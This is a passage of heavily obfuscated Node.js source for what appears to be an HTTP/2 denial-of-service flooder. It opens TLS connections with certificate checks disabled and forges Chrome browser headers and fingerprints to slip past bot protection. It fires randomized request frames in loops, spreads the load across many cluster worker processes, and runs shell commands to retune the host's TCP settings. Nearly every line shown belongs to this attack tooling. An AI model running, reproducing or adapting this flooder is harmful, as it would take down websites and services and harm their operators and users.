                'HEcMP': function (_0xbae0a8, _0x3545e9) {
                    return _0x54df1d[_0x4b4f('0x1c5')](_0xbae0a8, _0x3545e9);
                },
                'RERUl': function (_0x22d24f) {
                    return _0x54df1d[_0x4b4f('0xff')](_0x22d24f);
                },
                'qitMj': function (_0x394e96, _0x9b0865) {
                    return _0x54df1d[_0x4b4f('0xae')](_0x394e96, _0x9b0865);
                },
                'gzyHX': function (_0x375263, _0x92050c) {
                    return _0x54df1d['TuBNE'](_0x375263, _0x92050c);
                },
                'HCPjK': function (_0x2a4e06, _0x1d4c59) {
                    return _0x54df1d[_0x4b4f('0x8c')](_0x2a4e06, _0x1d4c59);
                }
            };
            _0x1fda9f = tls[_0x4b4f('0x41')]({
                'socket': _0x928331,
                'ALPNProtocols': forceHttp === 0x1 ? [_0x4b4f('0x132')] : _0x54df1d['WJfnb'](forceHttp, 0x2) ? ['h2'] : forceHttp === undefined ? _0x54df1d[_0x4b4f('0xc9')](Math[_0x4b4f('0x184')](), 0.5) ? ['h2'] : [_0x54df1d['LOGHi']] : [
                    'h2',
                    _0x54df1d[_0x4b4f('0x89')]
                ],
                'servername': url[_0x4b4f('0xd0')],
                'ciphers': _0x54df1d[_0x4b4f('0x165')],
                'sigalgs': _0x4b4f('0x86'),
                'secureOptions': _0x54df1d[_0x4b4f('0x188')](_0x54df1d['TGOvu'](_0x54df1d[_0x4b4f('0x188')](_0x54df1d[_0x4b4f('0x188')](_0x54df1d[_0x4b4f('0x1e')](_0x54df1d[_0x4b4f('0x1e')](_0x54df1d[_0x4b4f('0x1e')](_0x54df1d[_0x4b4f('0x14f')](_0x54df1d['tYoXp'](crypto['constants'][_0x4b4f('0x18c')], crypto[_0x4b4f('0x1c3')][_0x4b4f('0xde')]), crypto[_0x4b4f('0x1c3')][_0x4b4f('0x157')]), crypto['constants'][_0x4b4f('0x162')]), crypto[_0x4b4f('0x1c3')][_0x4b4f('0x59')]), crypto['constants'][_0x4b4f('0x18c')]), crypto[_0x4b4f('0x1c3')][_0x4b4f('0xbf')]), crypto['constants'][_0x4b4f('0x14a')]), crypto['constants'][_0x4b4f('0x142')]), crypto[_0x4b4f('0x1c3')][_0x4b4f('0x35')]),
                'secure': !![],
                'minVersion': _0x54df1d[_0x4b4f('0xdf')],
                'maxVersion': _0x54df1d[_0x4b4f('0x1c1')],
                'rejectUnauthorized': ![]
            }, () => {
                const _0x2c69d5 = {
                    'ypkWR': function (_0xa4e051) {
                        return _0xa4e051();
                    },
                    'yJhoR': function (_0x1eb0a7, _0x27edff) {
                        return _0x54df1d['iiPMj'](_0x1eb0a7, _0x27edff);
                    }
                };
                if (!_0x1fda9f[_0x4b4f('0x69')] || _0x54df1d['vyFwM'](_0x1fda9f[_0x4b4f('0x69')], _0x4b4f('0x132'))) {
                    if (_0x54df1d[_0x4b4f('0x23')](forceHttp, 0x2)) {
                        _0x1fda9f['end'](() => _0x1fda9f[_0x4b4f('0x6e')]());
                        return;
                    }
                    function _0x5abd8f() {
                        _0x1fda9f[_0x4b4f('0x172')](http1Payload, _0x53596f => {
                            const _0x4aa217 = {
                                'oLpSd': function (_0x3bb303) {
                                    return _0x2c69d5[_0x4b4f('0x154')](_0x3bb303);
                                }
                            };
                            if (!_0x53596f) {
                                setTimeout(() => {
                                    _0x4aa217[_0x4b4f('0x11e')](_0x5abd8f);
                                }, isFull ? 0x3e8 : _0x2c69d5[_0x4b4f('0xfc')](0x3e8, ratelimit));
                            } else {
                                _0x1fda9f[_0x4b4f('0x49')](() => _0x1fda9f['destroy']());
                            }
                        });
                    }
                    _0x54df1d[_0x4b4f('0x1d2')](_0x5abd8f);
                    _0x1fda9f['on'](_0x54df1d[_0x4b4f('0x166')], () => {
                        _0x1fda9f['end'](() => _0x1fda9f[_0x4b4f('0x6e')]());
                    });
                    return;
                }
                if (_0x54df1d[_0x4b4f('0xb7')](forceHttp, 0x1)) {
                    _0x1fda9f['end'](() => _0x1fda9f['destroy']());
                    return;
                }
                let _0x238c00 = 0x1;
                let _0x404e90 = Buffer[_0x4b4f('0x1bb')](0x0);
                let _0x367e3f = new HPACK();
                _0x367e3f['setTableSize'](0x1000);
                const _0x1028ec = Buffer[_0x4b4f('0x1bb')](0x4);
                _0x1028ec['writeUInt32BE'](custom_update, 0x0);
                const _0x1cc20d = [
                    Buffer[_0x4b4f('0x120')](PREFACE, _0x54df1d['rnXaJ']),
                    _0x54df1d[_0x4b4f('0xa5')](encodeFrame, 0x0, 0x4, _0x54df1d['NcgDk'](encodeSettings, [
                        [
                            0x1,
                            custom_header
                        ],
                        [
                            0x2,
                            0x0
                        ],
                        [
                            0x4,
                            custom_window
                        ],
                        [
                            0x6,
                            custom_table
                        ]
                    ])),
                    _0x54df1d[_0x4b4f('0x52')](encodeFrame, 0x0, 0x8, _0x1028ec)
                ];
                _0x1fda9f['on'](_0x4b4f('0xa8'), _0x23233e => {
                    _0x404e90 = Buffer['concat']([
                        _0x404e90,
                        _0x23233e
                    ]);
                    while (_0x46cfd2[_0x4b4f('0x158')](_0x404e90[_0x4b4f('0xd')], 0x9)) {
                        const _0x83bcb8 = _0x46cfd2['udnDC'](decodeFrame, _0x404e90);
                        if (_0x46cfd2[_0x4b4f('0x5')](_0x83bcb8, null)) {
                            _0x404e90 = _0x404e90[_0x4b4f('0x1be')](_0x46cfd2[_0x4b4f('0x40')](_0x83bcb8[_0x4b4f('0xd')], 0x9));
                            if (_0x83bcb8[_0x4b4f('0x1a5')] == 0x4 && _0x46cfd2['uKfjk'](_0x83bcb8[_0x4b4f('0x75')], 0x0)) {
                                _0x1fda9f[_0x4b4f('0x172')](_0x46cfd2['cSeLh'](encodeFrame, 0x0, 0x4, '', 0x1));
                            }
                            if (_0x46cfd2['aRYTB'](_0x83bcb8[_0x4b4f('0x1a5')], 0x1) && debugMode) {
                                const _0x488ea2 = _0x367e3f[_0x4b4f('0x4c')](_0x83bcb8[_0x4b4f('0xb4')])['find'](_0x4d6f0e => _0x4d6f0e[0x0] == _0x4b4f('0x155'))[0x1];
                                if (!statuses[_0x488ea2])
                                    statuses[_0x488ea2] = 0x0;
                                statuses[_0x488ea2]++;
                            }
                            if (_0x83bcb8['type'] == 0x7 || _0x46cfd2[_0x4b4f('0x3e')](_0x83bcb8[_0x4b4f('0x1a5')], 0x5)) {
                                if (_0x46cfd2['Bzqjq'](_0x83bcb8['type'], 0x7)) {
                                    if (debugMode) {
                                        if (!statuses[_0x46cfd2[_0x4b4f('0x31')]])
                                            statuses['GOAWAY'] = 0x0;
                                        statuses[_0x46cfd2[_0x4b4f('0x31')]]++;
                                    }
                                }
                                _0x1fda9f['write'](encodeRstStream(0x0, 0x3, 0x0));
                                _0x1fda9f[_0x4b4f('0x49')](() => _0x1fda9f[_0x4b4f('0x6e')]());
                            }
                        } else {
                            break;
                        }
                    }
                });
                _0x1fda9f[_0x4b4f('0x172')](Buffer[_0x4b4f('0x11c')](_0x1cc20d));
                function _0xcf7f65() {
                    const _0x42d8ec = {
                        'ZEICs': function (_0xcc768d, _0x55de83) {
                            return _0xcc768d === _0x55de83;
                        },
                        'uohKJ': function (_0x32eeb1, _0x15dd2b) {
                            return _0x46cfd2[_0x4b4f('0x40')](_0x32eeb1, _0x15dd2b);
                        },
                        'JrcwZ': function (_0x39477a, _0xa62cb2) {
                            return _0x46cfd2[_0x4b4f('0x12e')](_0x39477a, _0xa62cb2);
                        },
                        'EdErr': function (_0x3cf0e4, _0x42dcc9) {
                            return _0x46cfd2[_0x4b4f('0x150')](_0x3cf0e4, _0x42dcc9);
                        },
                        'fDWIz': function (_0x3ca922, _0x2c0205) {
                            return _0x46cfd2[_0x4b4f('0x150')](_0x3ca922, _0x2c0205);
                        },
                        'acWtp': _0x46cfd2['MZPDi'],
                        'CbYDO': function (_0x123198, _0x258e59) {
                            return _0x46cfd2[_0x4b4f('0x8f')](_0x123198, _0x258e59);
                        },
                        'OAohO': function (_0x195b27, _0x1a4223) {
                            return _0x46cfd2[_0x4b4f('0xab')](_0x195b27, _0x1a4223);
                        },
                        'sIBWe': _0x46cfd2[_0x4b4f('0x122')],
                        'kmCAd': _0x46cfd2[_0x4b4f('0x167')],
                        'bfMnE': function (_0x32586a, _0x381f1f) {
                            return _0x32586a === _0x381f1f;
                        },
                        'idsjD': function (_0x528563, _0x3e4ecc) {
                            return _0x46cfd2[_0x4b4f('0x150')](_0x528563, _0x3e4ecc);
                        },
                        'XlMfJ': function (_0x3f0452, _0x2e6c46, _0x3bf727) {
                            return _0x46cfd2[_0x4b4f('0x92')](_0x3f0452, _0x2e6c46, _0x3bf727);
                        },
                        'pfncL': function (_0x19e3dd, _0x156a39) {
                            return _0x19e3dd === _0x156a39;
                        },
                        'oZlmt': function (_0x3b1de7, _0x4403ee) {
                            return _0x46cfd2[_0x4b4f('0x123')](_0x3b1de7, _0x4403ee);
                        },
                        'jqowL': function (_0x3b078c, _0x33f589) {
                            return _0x46cfd2[_0x4b4f('0x123')](_0x3b078c, _0x33f589);
                        },
                        'dEPBQ': _0x4b4f('0xd2'),
                        'YyhoR': function (_0x48120e, _0x5223c5, _0x21743e) {
                            return _0x46cfd2[_0x4b4f('0x104')](_0x48120e, _0x5223c5, _0x21743e);
                        },
                        'FUusK': function (_0x60d70e, _0x55b7e0, _0x10c9a9) {
                            return _0x46cfd2[_0x4b4f('0x12a')](_0x60d70e, _0x55b7e0, _0x10c9a9);
                        },
                        'DpUVP': function (_0x2c853c, _0x390434, _0xa23179) {
                            return _0x2c853c(_0x390434, _0xa23179);
                        },
                        'kFQmb': function (_0x1088a4, _0x3b3736) {
                            return _0x46cfd2[_0x4b4f('0x185')](_0x1088a4, _0x3b3736);
                        }
                    };
                    if (_0x1fda9f[_0x4b4f('0xe5')]) {
                        return;
                    }
                    const _0x3d41b5 = [];
                    const _0x41704b = [];
                    if (customHeaders) {
                        const _0x26c51d = customHeaders[_0x4b4f('0xc0')]('#');
                        for (const _0x26a8d3 of _0x26c51d) {
                            const [_0x2ed8d2, _0x4ac5df] = _0x26a8d3[_0x4b4f('0xc0')](':');
                            if (_0x46cfd2['vEEId'](_0x2ed8d2, _0x4ac5df)) {
                                _0x41704b['push']({ [_0x2ed8d2[_0x4b4f('0xa3')]()[_0x4b4f('0x12d')]()]: _0x4ac5df[_0x4b4f('0xa3')]() });
                            }
                        }
                    }
                    let _0x18819b;
                    if (_0x46cfd2[_0x4b4f('0x7d')](randrate, undefined)) {
                        _0x18819b = _0x46cfd2['iqkGi'](getRandomInt, 0x1, 0x3b);
                    } else {
                        _0x18819b = process[_0x4b4f('0x19b')][0x6];
                    }
                    for (let _0x292b55 = 0x0; _0x46cfd2[_0x4b4f('0xb')](_0x292b55, isFull ? _0x18819b : 0x1); _0x292b55++) {
                        const _0xe6b584 = _0x46cfd2[_0x4b4f('0x19d')](getRandomInt, 0x78, 0x7b);
                        const _0x54ce7a = [
                            _0x4b4f('0x15e'),
                            _0x46cfd2[_0x4b4f('0x9a')]
                        ];
                        const _0x1a2358 = _0x54ce7a[Math['floor'](_0x46cfd2[_0x4b4f('0x130')](Math['random'](), _0x54ce7a[_0x4b4f('0xd')]))];
                        const _0x2e96db = [
                            _0x46cfd2['aWtCc'],
                            _0x46cfd2[_0x4b4f('0xe')],
                            _0x46cfd2[_0x4b4f('0x1d0')]
                        ];
                        const _0x259a05 = _0x2e96db[Math[_0x4b4f('0xb2')](Math[_0x4b4f('0x184')]() * _0x2e96db[_0x4b4f('0xd')])];
                        let _0x17eaec;
                        if (_0x46cfd2[_0x4b4f('0x15a')](_0xe6b584, 0x78)) {
                            _0x17eaec = _0x4b4f('0x71') + _0xe6b584 + _0x4b4f('0x1b3') + _0x1a2358 + _0x4b4f('0x131') + _0xe6b584 + '\x22';
                        } else if (_0x46cfd2[_0x4b4f('0x1ce')](_0xe6b584, 0x79)) {
                            _0x17eaec = _0x4b4f('0x191') + _0x1a2358 + _0x4b4f('0x131') + _0xe6b584 + _0x4b4f('0x61') + _0xe6b584 + '\x22';
                        } else if (_0x46cfd2[_0x4b4f('0x78')](_0xe6b584, 0x7a)) {
                            _0x17eaec = _0x4b4f('0x19c') + _0xe6b584 + _0x4b4f('0x8') + _0x1a2358 + '\x22;v=\x22' + _0xe6b584 + '\x22';
                        } else if (_0xe6b584 === 0x7b) {
                            _0x17eaec = '\x22' + _0x1a2358 + _0x4b4f('0x131') + _0xe6b584 + _0x4b4f('0xfb') + _0xe6b584 + '\x22';
                        }
                        const _0x22b036 = _0x46cfd2['CyzsY'](_0x1a2358, _0x46cfd2[_0x4b4f('0x9a')]);
                        const _0x1c1cfc = _0x22b036 ? _0x4b4f('0x14b') : _0x46cfd2[_0x4b4f('0x83')];
                        const _0x48c22c = _0x22b036 ? _0x46cfd2[_0x4b4f('0x1a1')] : _0x46cfd2[_0x4b4f('0x18a')];
                        const _0x1c4562 = _0x22b036 ? '1' : undefined;
                        const _0x25367a = _0x22b036 ? '\x22\x22' : undefined;
                        const _0x5dcaf3 = _0x22b036 ? _0x46cfd2['EHFwr'] : undefined;
                        const _0x2e0b23 = _0x22b036 ? _0x46cfd2[_0x4b4f('0x3')] : undefined;
                        const _0x1d81b5 = _0x22b036 ? '?0' : undefined;
                        var _0x3ad3cc = 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/' + _0xe6b584 + _0x4b4f('0x111');
                        if (customUA) {
                            _0x3ad3cc = customUA;
                        } else {
                            _0x3ad3cc = _0x4b4f('0x1cf') + _0xe6b584 + '.0.0.0\x20Safari/537.36';
                        }
                        const _0x117e25 = '' + _0x17eaec;
                        const _0x1ec1aa = refererValue === _0x46cfd2[_0x4b4f('0x175')] ? _0x46cfd2[_0x4b4f('0xaa')](_0x46cfd2[_0x4b4f('0x25')](_0x46cfd2['HvvDj'], ememmmmmemmeme(0x6, 0x6)), _0x46cfd2[_0x4b4f('0x5e')]) : refererValue;
                        const _0x528053 = Object[_0x4b4f('0x33')]({
                            ':method': reqmethod,
                            ':authority': url[_0x4b4f('0x198')],
                            ':scheme': _0x4b4f('0xac'),
                            ':path': query ? _0x46cfd2[_0x4b4f('0xab')](_0x36fc6f, query) : url['pathname'] + (postdata ? '?' + postdata : '')
                        })[_0x4b4f('0x11c')](Object[_0x4b4f('0x33')]({
                            ..._0x46cfd2[_0x4b4f('0x10b')](Math[_0x4b4f('0x184')](), 0.4) && { 'cache-control': _0x4b4f('0x6b') },
                            ..._0x46cfd2['mqEuM'](reqmethod, _0x46cfd2[_0x4b4f('0xb3')]) && { 'content-length': '0' },
                            'sec-ch-ua': _0x117e25,
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': _0x4b4f('0x99'),
                            'upgrade-insecure-requests': '1',
                            'user-agent': _0x3ad3cc,
                            'accept': _0x1c1cfc,
                            ..._0x1c4562 && { 'sec-gpc': _0x1c4562 },
                            ..._0x46cfd2[_0x4b4f('0x12b')](_0x1d81b5, { 'sec-ch-ua-mobile': _0x1d81b5 }),
                            ..._0x46cfd2['cnfoz'](_0x25367a, { 'sec-ch-ua-model': _0x25367a }),
                            ..._0x46cfd2[_0x4b4f('0x10c')](_0x5dcaf3, { 'sec-ch-ua-platform': _0x5dcaf3 }),
                            ..._0x46cfd2['cnfoz'](_0x2e0b23, { 'sec-ch-ua-platform-version': _0x2e0b23 }),
                            ..._0x46cfd2[_0x4b4f('0x13d')](Math[_0x4b4f('0x184')](), 0.5) && { 'sec-fetch-site': _0x1ec1aa ? _0x259a05 : _0x46cfd2[_0x4b4f('0x70')] },
                            ..._0x46cfd2[_0x4b4f('0xe7')](Math['random'](), 0.5) && { 'sec-fetch-mode': _0x46cfd2[_0x4b4f('0xea')] },
                            ..._0x46cfd2[_0x4b4f('0x1c6')](Math['random'](), 0.5) && { 'sec-fetch-user': '?1' },
                            ..._0x46cfd2[_0x4b4f('0x17b')](Math[_0x4b4f('0x184')](), 0.5) && { 'sec-fetch-dest': _0x46cfd2[_0x4b4f('0xba')] },
                            'accept-encoding': _0x46cfd2[_0x4b4f('0xd9')],
                            'accept-language': _0x48c22c,
                            ..._0x46cfd2['cnfoz'](hcookie, { 'cookie': hcookie }),
                            ..._0x46cfd2[_0x4b4f('0xf3')](_0x1ec1aa, { 'referer': _0x1ec1aa }),
                            ..._0x41704b[_0x4b4f('0x11')]((_0xa08695, _0x3d218c) => ({
                                ..._0xa08695,
                                ..._0x3d218c
                            }), {})
                        })[_0x4b4f('0x144')](_0x2a1e61 => _0x2a1e61[0x1] != null));
                        const _0x42d0e3 = Object[_0x4b4f('0x33')]({
                            ':method': reqmethod,
                            ':authority': url[_0x4b4f('0x198')],
                            ':scheme': 'https',
                            ':path': query ? _0x46cfd2[_0x4b4f('0x1ad')](_0x36fc6f, query) : url[_0x4b4f('0x30')] + (postdata ? '?' + postdata : '')
                        })[_0x4b4f('0x11c')](Object['entries']({
                            ..._0x46cfd2[_0x4b4f('0xbe')](Math['random'](), 0.4) && { 'cache-control': _0x46cfd2[_0x4b4f('0x11d')] },
                            ..._0x46cfd2[_0x4b4f('0xe8')](reqmethod, _0x4b4f('0x73')) && { 'content-length': '0' },
                            'sec-ch-ua': _0x117e25,
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '\x22Windows\x22',
                            'upgrade-insecure-requests': '1',
                            'user-agent': _0x3ad3cc,
                            'accept': _0x1c1cfc,
                            ..._0x1c4562 && { 'sec-gpc': _0x1c4562 },
                            ..._0x46cfd2['iIPaa'](_0x1d81b5, { 'sec-ch-ua-mobile': _0x1d81b5 }),
                            ..._0x25367a && { 'sec-ch-ua-model': _0x25367a },
                            ..._0x46cfd2['iIPaa'](_0x5dcaf3, { 'sec-ch-ua-platform': _0x5dcaf3 }),
                            ..._0x2e0b23 && { 'sec-ch-ua-platform-version': _0x2e0b23 },
                            'sec-fetch-site': _0x1ec1aa ? _0x259a05 : _0x46cfd2[_0x4b4f('0x70')],
                            'sec-fetch-mode': _0x46cfd2[_0x4b4f('0xea')],
                            'sec-fetch-user': '?1',
                            'sec-fetch-dest': _0x46cfd2['GaHgN'],
                            'accept-encoding': _0x4b4f('0xbd'),
                            'accept-language': _0x48c22c,
                            ..._0x46cfd2[_0x4b4f('0x121')](hcookie, { 'cookie': hcookie }),
                            ..._0x46cfd2[_0x4b4f('0x97')](_0x1ec1aa, { 'referer': _0x1ec1aa }),
                            ..._0x41704b[_0x4b4f('0x11')]((_0x5985c8, _0x29f1d5) => ({
                                ..._0x5985c8,
                                ..._0x29f1d5
                            }), {})
                        })['filter'](_0x546e15 => _0x546e15[0x1] != null));
                        const _0x2b2e7c = Object['entries']({
                            ...Math[_0x4b4f('0x184')]() < 0.3 && { [_0x4b4f('0x7e') + getRandomChar()]: _0x4b4f('0xad') + _0x46cfd2[_0x4b4f('0xdd')](getRandomChar) },
                            ..._0x46cfd2[_0x4b4f('0xbe')](Math[_0x4b4f('0x184')](), 0.3) && { ['sec-ms-gec-version' + _0x46cfd2[_0x4b4f('0xdd')](getRandomChar)]: _0x4b4f('0xd4') + _0x46cfd2['hBTtF'](getRandomChar) },
                            ..._0x46cfd2[_0x4b4f('0x199')](Math[_0x4b4f('0x184')](), 0.3) && { [_0x4b4f('0x125') + _0x46cfd2[_0x4b4f('0x113')](getRandomChar)]: '?0' + getRandomChar() },
                            ..._0x46cfd2[_0x4b4f('0x118')](Math[_0x4b4f('0x184')](), 0.3) && { [_0x4b4f('0x74') + _0x46cfd2[_0x4b4f('0x115')](getRandomChar)]: _0x4b4f('0x16c') + _0x46cfd2[_0x4b4f('0x115')](getRandomChar) }
                        })[_0x4b4f('0x144')](_0x5240e8 => _0x5240e8[0x1] != null);
                        for (let _0x59021b = _0x46cfd2[_0x4b4f('0x136')](_0x2b2e7c['length'], 0x1); _0x46cfd2[_0x4b4f('0x29')](_0x59021b, 0x0); _0x59021b--) {
                            const _0x43185c = Math[_0x4b4f('0xb2')](Math[_0x4b4f('0x184')]() * _0x46cfd2[_0x4b4f('0x7b')](_0x59021b, 0x1));
                            [_0x2b2e7c[_0x59021b], _0x2b2e7c[_0x43185c]] = [
                                _0x2b2e7c[_0x43185c],
                                _0x2b2e7c[_0x59021b]
                            ];
                        }
                        const _0x40fa0 = useLegitHeaders ? _0x42d0e3['concat']() : _0x528053[_0x4b4f('0x11c')](_0x2b2e7c);
                        function _0x36fc6f(_0x21a656) {
                            if (_0x42d8ec[_0x4b4f('0x1c7')](_0x21a656, '1')) {
                                return _0x42d8ec['uohKJ'](_0x42d8ec[_0x4b4f('0x7c')](_0x42d8ec[_0x4b4f('0x67')](_0x42d8ec[_0x4b4f('0x94')](_0x42d8ec[_0x4b4f('0x194')](_0x42d8ec[_0x4b4f('0x194')](_0x42d8ec[_0x4b4f('0x194')](_0x42d8ec[_0x4b4f('0x194')](url[_0x4b4f('0x30')], _0x42d8ec[_0x4b4f('0x22')]), _0x42d8ec['CbYDO'](randstrr, 0x1e)), '_'), _0x42d8ec[_0x4b4f('0x109')](randstrr, 0xc)), '-'), timestampString), _0x42d8ec[_0x4b4f('0x9b')]), _0x42d8ec[_0x4b4f('0x18')]) + _0x42d8ec[_0x4b4f('0x109')](randstrr, 0x8);
                            } else if (_0x42d8ec['bfMnE'](_0x21a656, '2')) {
                                return _0x42d8ec[_0x4b4f('0x194')](_0x42d8ec[_0x4b4f('0x1')](url[_0x4b4f('0x30')] + '?' + _0x42d8ec[_0x4b4f('0xdb')](generateRandomString, 0x6, 0x7), '&'), _0x42d8ec[_0x4b4f('0xdb')](generateRandomString, 0x6, 0x7));
                            } else if (_0x42d8ec[_0x4b4f('0x14e')](_0x21a656, '3')) {
                                return _0x42d8ec[_0x4b4f('0x1')](_0x42d8ec[_0x4b4f('0x141')](_0x42d8ec[_0x4b4f('0x18d')](url[_0x4b4f('0x30')] + _0x42d8ec[_0x4b4f('0x10a')], _0x42d8ec[_0x4b4f('0xeb')](generateRandomString, 0x6, 0x7)), '&'), _0x42d8ec['FUusK'](generateRandomString, 0x6, 0x7));
                            } else {
                                return url[_0x4b4f('0x30')];
                            }
                        }
                        const _0x3fff8a = Buffer[_0x4b4f('0x11c')]([
                            Buffer[_0x4b4f('0x120')]([
                                0x80,
                                0x0,
                                0x0,
                                0x0,
                                0xff
                            ]),
                            _0x367e3f['encode'](_0x40fa0)
                        ]);
                        _0x3d41b5[_0x4b4f('0x72')](_0x46cfd2[_0x4b4f('0x151')](encodeFrame, _0x238c00, 0x1, _0x3fff8a, 0x25));
                        _0x238c00 += 0x2;
                    }
                    _0x1fda9f['write'](Buffer[_0x4b4f('0x11c')](_0x3d41b5), _0x21b0fc => {
                        if (!_0x21b0fc) {
                            _0x42d8ec[_0x4b4f('0x1ae')](setTimeout, () => {
                                _0xcf7f65();
                            }, isFull ? 0x3e8 : _0x42d8ec[_0x4b4f('0xdc')](0x3e8, _0x18819b));
                        }
                    });
                }
                _0x54df1d[_0x4b4f('0x1d2')](_0xcf7f65);
            })['on'](_0x4b4f('0xc6'), () => {
                _0x1fda9f['destroy']();
            });
        });
        _0x928331['write'](_0x4b4f('0x1c8') + url[_0x4b4f('0xd0')] + _0x4b4f('0x140') + url[_0x4b4f('0xd0')] + _0x4b4f('0xf0'));
    })[_0x4b4f('0xcb')]('error', () => {
    })[_0x4b4f('0xcb')](_0x3bf61c[_0x4b4f('0x16e')], () => {
        if (_0x1fda9f) {
            _0x1fda9f[_0x4b4f('0x49')](() => {
                _0x1fda9f['destroy']();
                go();
            });
        }
    });
}
function TCP_CHANGES_SERVER() {
    const _0x353a0e = {
        'tmIAg': _0x4b4f('0x114'),
        'yTnzE': 'dctcp',
        'vHydu': function (_0x465a63, _0x1274cf) {
            return _0x465a63 * _0x1274cf;
        },
        'lqOLE': function (_0x2b7c22, _0xa6f54d) {
            return _0x2b7c22 * _0xa6f54d;
        },
        'WYGEc': function (_0x5b2738, _0x3ffb62, _0x459490) {
            return _0x5b2738(_0x3ffb62, _0x459490);
        }
    };
    const _0x7535f2 = [
        _0x353a0e[_0x4b4f('0x26')],
        'reno',
        _0x4b4f('0x1a8'),
        _0x353a0e[_0x4b4f('0x50')],
        _0x4b4f('0x1aa')
    ];
    const _0x315792 = [
        '1',
        '0'
    ];
    const _0x519d0a = [
        '1',
        '0'
    ];
    const _0x48d8ae = [
        '1',
        '0'
    ];
    const _0x399018 = [
        '1',
        '0'
    ];
    const _0x45ccd0 = [
        '3',
        '2',
        '1',
        '0'
    ];
    const _0x536996 = _0x7535f2[Math[_0x4b4f('0xb2')](_0x353a0e[_0x4b4f('0x192')](Math[_0x4b4f('0x184')](), _0x7535f2[_0x4b4f('0xd')]))];
    const _0x152e32 = _0x315792[Math[_0x4b4f('0xb2')](_0x353a0e['vHydu'](Math['random'](), _0x315792['length']))];
    const _0xfcb34f = _0x519d0a[Math[_0x4b4f('0xb2')](Math['random']() * _0x519d0a['length'])];
    const _0x5e7338 = _0x48d8ae[Math[_0x4b4f('0xb2')](_0x353a0e['lqOLE'](Math[_0x4b4f('0x184')](), _0x48d8ae[_0x4b4f('0xd')]))];
    const _0x4df572 = _0x399018[Math[_0x4b4f('0xb2')](_0x353a0e[_0x4b4f('0x11b')](Math[_0x4b4f('0x184')](), _0x399018[_0x4b4f('0xd')]))];
    const _0x8941af = _0x45ccd0[Math[_0x4b4f('0xb2')](_0x353a0e[_0x4b4f('0x11b')](Math[_0x4b4f('0x184')](), _0x45ccd0['length']))];
    const _0x49a3bc = _0x4b4f('0xc8') + _0x536996 + _0x4b4f('0x135') + _0x152e32 + _0x4b4f('0x51') + _0xfcb34f + _0x4b4f('0x9f') + _0x5e7338 + _0x4b4f('0x135') + _0x4df572 + _0x4b4f('0x4a') + _0x8941af;
    _0x353a0e[_0x4b4f('0x177')](exec, _0x49a3bc, () => {
    });
}
setInterval(() => {
    timer++;
}, 0x3e8);
setInterval(() => {
    const _0x3ed30f = {
        'ZEoCN': function (_0x3dc109, _0x4ffdcf) {
            return _0x3dc109 <= _0x4ffdcf;
        },
        'zpRAS': function (_0x45e36c, _0xc22ca5) {
            return _0x45e36c + _0xc22ca5;
        },
        'ASuyW': _0x4b4f('0x42')
    };
    if (_0x3ed30f[_0x4b4f('0x10e')](timer, 0xa)) {
        custom_header = _0x3ed30f[_0x4b4f('0x1c4')](custom_header, 0x1);
        custom_window = custom_window + 0x1;
        custom_table = custom_table + 0x1;
        custom_update = custom_update + 0x1;
    } else {
        const _0x5be842 = _0x3ed30f[_0x4b4f('0x13e')][_0x4b4f('0xc0')]('|');
        let _0x42caf3 = 0x0;
        while (!![]) {
            switch (_0x5be842[_0x42caf3++]) {
            case '0':
                custom_header = 0x40000;
                continue;
            case '1':
                timer = 0x0;
                continue;
            case '2':
                custom_window = 0x600000;
                continue;
            case '3':
                custom_table = 0x10000;
                continue;
            case '4':
                custom_update = 0xef0001;
                continue;
            }
            break;
        }
    }
}, 0x2710);
if (cluster['isMaster']) {
    const workers = {};
    Array[_0x4b4f('0x120')]({ 'length': threads }, (_0x4084a0, _0x4f4a0f) => cluster[_0x4b4f('0xf9')]({ 'core': _0x4f4a0f % os[_0x4b4f('0x17')]()['length'] }));
    console[_0x4b4f('0x1c')](_0x4b4f('0x133'));
    const {exec} = require(_0x4b4f('0x4e'));
    exec(_0x4b4f('0x1c2')), cluster['on'](_0x4b4f('0x27'), _0x136251 => {
        const _0x371142 = {
            'zVvIt': function (_0x5385d9, _0x13794c) {
                return _0x5385d9 % _0x13794c;
            }
        };
        cluster[_0x4b4f('0xf9')]({ 'core': _0x371142['zVvIt'](_0x136251['id'], os[_0x4b4f('0x17')]()['length']) });
    });
    cluster['on'](_0x4b4f('0x169'), (_0x5ab962, _0x4e32ba) => {
        workers[_0x5ab962['id']] = [
            _0x5ab962,
            _0x4e32ba
        ];
    });
    if (debugMode) {
        setInterval(() => {
            const _0x43fec6 = {
                'akXeM': function (_0x2b186d, _0x2476ad) {
                    return _0x2b186d == _0x2476ad;
                }
            };
            let _0x5d9100 = {};
            for (let _0x54832c in workers) {
                if (workers[_0x54832c][0x0][_0x4b4f('0xcc')] == _0x4b4f('0x14d')) {
                    for (let _0x480ef8 of workers[_0x54832c][0x1]) {
                        for (let _0x4b091b in _0x480ef8) {
                            if (_0x43fec6[_0x4b4f('0x4f')](_0x5d9100[_0x4b091b], null))
                                _0x5d9100[_0x4b091b] = 0x0;
                            _0x5d9100[_0x4b091b] += _0x480ef8[_0x4b091b];
                        }
                    }
                }
            }
            console[_0x4b4f('0x54')]();
            console['log'](new Date()[_0x4b4f('0xe6')]('us'), _0x5d9100);
        }, 0x3e8);
    }
    setInterval(TCP_CHANGES_SERVER, 0x1388);
    setTimeout(() => process[_0x4b4f('0x27')](0x1), time * 0x3e8);
} else {
    let conns = 0x0;
    let i = setInterval(() => {
        const _0xad1d3b = {
            'BXSWX': function (_0x351e0c, _0x1a16e4) {
                return _0x351e0c < _0x1a16e4;
            },
            'RZnvE': function (_0x2a22a8, _0x7b9114) {
                return _0x2a22a8(_0x7b9114);
            },
            'FRvoh': function (_0x2719af) {
                return _0x2719af();
            }
        };
        if (_0xad1d3b[_0x4b4f('0x170')](conns, 0x7530)) {
            conns++;
        } else {
            _0xad1d3b[_0x4b4f('0x1b0')](clearInterval, i);
            return;
        }
        _0xad1d3b[_0x4b4f('0x6a')](go);
    }, delay);
    if (debugMode) {
        setInterval(() => {
            const _0x21b410 = {
                'hHOkk': function (_0x5a11af, _0x47df0a) {
                    return _0x5a11af >= _0x47df0a;
                }
            };
            if (_0x21b410[_0x4b4f('0xf7')](statusesQ[_0x4b4f('0xd')], 0x4))
                statusesQ[_0x4b4f('0x3d')]();
